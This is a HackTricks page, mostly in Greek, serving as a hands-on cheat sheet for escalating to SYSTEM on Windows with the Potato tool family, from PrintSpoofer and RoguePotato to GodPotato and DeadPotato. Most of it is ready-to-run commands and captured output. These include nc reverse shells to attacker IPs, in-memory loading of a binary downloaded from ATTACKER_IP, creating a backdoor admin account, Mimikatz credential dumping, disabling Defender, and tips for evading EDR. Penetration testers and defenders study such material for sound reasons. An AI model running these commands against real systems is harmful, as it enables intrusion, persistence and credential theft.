# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato δεν λειτουργεί** σε Windows Server 2019 και Windows 10 build 1809 και μετά. Ωστόσο, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** μπορούν να χρησιμοποιηθούν για να εκμεταλλευτούν τα ίδια προνόμια και να αποκτήσουν πρόσβαση επιπέδου `NT AUTHORITY\SYSTEM`. Αυτή η [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) εξηγεί σε βάθος το εργαλείο `PrintSpoofer`, το οποίο μπορεί να χρησιμοποιηθεί για την κατάχρηση impersonation privileges σε hosts με Windows 10 και Server 2019 όπου το JuicyPotato δεν λειτουργεί πλέον.

> [!TIP]
> Μια σύγχρονη εναλλακτική που συντηρείται συχνά το 2024–2025 είναι η SigmaPotato (ένα fork του GodPotato) που προσθέτει χρήση in-memory/.NET reflection και εκτεταμένη υποστήριξη OS. Δείτε τη γρήγορη χρήση παρακάτω και το repo στις Αναφορές.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Απαιτήσεις και συνηθισμένα προβλήματα

Όλες οι παρακάτω τεχνικές βασίζονται στην κατάχρηση μιας υπηρεσίας που είναι impersonation-capable από ένα περιβάλλον που κατέχει κάποιο από τα παρακάτω προνόμια:

- SeImpersonatePrivilege (το πιο συνηθισμένο) ή SeAssignPrimaryTokenPrivilege
- High integrity δεν είναι απαραίτητο αν το token έχει ήδη SeImpersonatePrivilege (τυπικό για πολλούς service accounts όπως IIS AppPool, MSSQL, κ.λπ.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Λειτουργικές σημειώσεις:

- Εάν το shell σας τρέχει κάτω από ένα περιορισμένο token που δεν έχει SeImpersonatePrivilege (συνηθισμένο για Local Service/Network Service σε ορισμένα περιβάλλοντα), ανακτήστε τα προεπιλεγμένα προνόμια του λογαριασμού χρησιμοποιώντας FullPowers, και μετά τρέξτε ένα Potato. Παράδειγμα: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- Το PrintSpoofer χρειάζεται την υπηρεσία Print Spooler να τρέχει και να είναι προσβάσιμη μέσω του τοπικού RPC endpoint (spoolss). Σε σκληροδεμένα περιβάλλοντα όπου ο Spooler έχει απενεργοποιηθεί μετά το PrintNightmare, προτιμήστε RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- Το RoguePotato απαιτεί έναν OXID resolver προσβάσιμο στο TCP/135. Εάν το egress είναι μπλοκαρισμένο, χρησιμοποιήστε έναν redirector/port-forwarder (δείτε παράδειγμα παρακάτω). Παλαιότερες εκδόσεις χρειάζονταν τη σημαία -f.
- Το EfsPotato/SharpEfsPotato καταχρώνται το MS-EFSR· εάν ένας pipe είναι μπλοκαρισμένος, δοκιμάστε εναλλακτικούς pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Το σφάλμα 0x6d3 κατά το RpcBindingSetAuthInfo συνήθως υποδεικνύει άγνωστη/μη υποστηριζόμενη RPC authentication service· δοκιμάστε άλλο pipe/transport ή βεβαιωθείτε ότι η στοχευόμενη υπηρεσία τρέχει.
- Forks τύπου “Kitchen-sink” όπως το DeadPotato συνοδεύουν επιπλέον payload modules (Mimikatz/SharpHound/Defender off) που γράφουν στο δίσκο· περιμένετε υψηλότερη ανίχνευση από EDR σε σύγκριση με τα πιο ελαφριά πρωτότυπα.

## Γρήγορη επίδειξη

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Σημειώσεις:
- Μπορείτε να χρησιμοποιήσετε -i για να εκκινήσετε μια διαδραστική διεργασία στην τρέχουσα κονσόλα, ή -c για να εκτελέσετε μια εντολή μίας γραμμής.
- Απαιτεί την υπηρεσία Spooler. Αν είναι απενεργοποιημένη, αυτό θα αποτύχει.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Αν το outbound 135 είναι μπλοκαρισμένο, pivot τον OXID resolver μέσω socat στον redirector σου:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

Το PrintNotifyPotato είναι ένα νεότερο COM abuse primitive που κυκλοφόρησε στα τέλη του 2022 και στοχεύει την υπηρεσία **PrintNotify** αντί του Spooler/BITS. Το binary instantiates τον PrintNotify COM server, αντικαθιστά ένα fake `IUnknown`, και ενεργοποιεί ένα privileged callback μέσω του `CreatePointerMoniker`. Όταν η υπηρεσία PrintNotify (τρέχοντας ως **SYSTEM**) συνδεθεί πίσω, η διεργασία duplicates το επιστρεφόμενο token και spawns το παρεχόμενο payload με πλήρη privileges.

Key operational notes:

* Λειτουργεί σε Windows 10/11 και Windows Server 2012–2022 εφόσον η υπηρεσία Print Workflow/PrintNotify είναι εγκατεστημένη (παρουσιάζεται ακόμα και όταν ο legacy Spooler είναι απενεργοποιημένος μετά το PrintNightmare).
* Απαιτεί το calling context να έχει **SeImpersonatePrivilege** (τυπικό για IIS APPPOOL, MSSQL, και λογαριασμούς υπηρεσιών scheduled-task).
* Δέχεται είτε άμεση εντολή είτε διαδραστική λειτουργία ώστε να μπορείτε να παραμείνετε μέσα στην αρχική κονσόλα. Παράδειγμα:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Επειδή είναι καθαρά COM-based, δεν απαιτούνται named-pipe listeners ή εξωτερικοί redirectors, καθιστώντας το ένα drop-in replacement σε hosts όπου ο Defender μπλοκάρει το RoguePotato’s RPC binding.

Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Συμβουλή: Αν κάποιο pipe αποτύχει ή το EDR το μπλοκάρει, δοκιμάστε τα υπόλοιπα υποστηριζόμενα pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Σημειώσεις:
- Λειτουργεί σε Windows 8/8.1–11 και Server 2012–2022 όταν υπάρχει το SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

Το DCOMPotato παρέχει δύο παραλλαγές που στοχεύουν service DCOM objects στα οποία το προεπιλεγμένο επίπεδο είναι RPC_C_IMP_LEVEL_IMPERSONATE. Κατασκευάστε ή χρησιμοποιήστε τα παρέχόμενα binaries και εκτελέστε την εντολή σας:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ενημερωμένο fork του GodPotato)

SigmaPotato προσθέτει σύγχρονες βελτιώσεις όπως in-memory execution μέσω .NET reflection και έναν PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Πρόσθετα πλεονεκτήματα στις εκδόσεις 2024–2025 (v1.2.x):
- Ενσωματωμένη σημαία reverse shell `--revshell` και αφαίρεση του ορίου των 1024 χαρακτήρων του PowerShell ώστε να μπορείτε να στείλετε μεγάλα AMSI-bypassing payloads μονομιάς.
- Reflection-friendly σύνταξη (`[SigmaPotato]::Main()`), καθώς και ένα πρόχειρο AV evasion τέχνασμα μέσω `VirtualAllocExNuma()` για να μπερδέψει απλούς heuristics.
- Ξεχωριστό `SigmaPotatoCore.exe` μεταγλωττισμένο για .NET 2.0 για περιβάλλοντα PowerShell Core.

### DeadPotato (2024 GodPotato ανασχεδιασμός με modules)

Το DeadPotato διατηρεί την αλυσίδα impersonation OXID/DCOM του GodPotato αλλά ενσωματώνει βοηθήματα post-exploitation ώστε οι χειριστές να μπορούν αμέσως να αποκτήσουν SYSTEM και να πραγματοποιήσουν persistence/collection χωρίς επιπλέον εργαλεία.

Συνήθη modules (όλα απαιτούν SeImpersonatePrivilege):

- `-cmd "<cmd>"` — εκκινεί αυθαίρετη εντολή ως SYSTEM.
- `-rev <ip:port>` — γρήγορο reverse shell.
- `-newadmin user:pass` — δημιουργεί έναν τοπικό admin για persistence.
- `-mimi sam|lsa|all` — τοποθετεί και εκτελεί Mimikatz για να κάνετε dump credentials (αγγίζει δίσκο, πολύ θορυβώδες).
- `-sharphound` — εκτελεί τη συλλογή SharpHound ως SYSTEM.
- `-defender off` — απενεργοποιεί το Defender real-time protection (πολύ θορυβώδες).

Παραδείγματα one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Επειδή συνοδεύεται από επιπλέον binaries, αναμένετε αυξημένα AV/EDR flags· χρησιμοποιήστε το πιο slim GodPotato/SigmaPotato όταν έχει σημασία το stealth.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
